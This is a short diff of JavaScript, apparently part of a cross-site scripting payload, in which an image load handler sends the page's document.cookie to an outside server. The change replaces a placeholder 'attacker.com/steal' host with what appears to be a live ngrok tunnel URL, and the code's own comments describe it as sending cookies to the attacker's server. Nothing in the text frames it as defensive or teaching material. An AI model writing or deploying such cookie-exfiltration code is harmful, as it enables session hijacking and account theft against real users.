@@ -18,7 +18,7 @@
             img.onload = function() {
                 // Since we cannot directly access the cookies, we can send the request to our server
                 var xhr = new XMLHttpRequest();
-                xhr.open("GET", "https://attacker.com/steal?cookies=" + document.cookie, true); // Send the cookies to the attacker's server
+                xhr.open("GET", "https://bd72-36-73-33-194.ngrok-free.app" + document.cookie, true); // Send the cookies to the attacker's server
                 xhr.send();
             };
         };
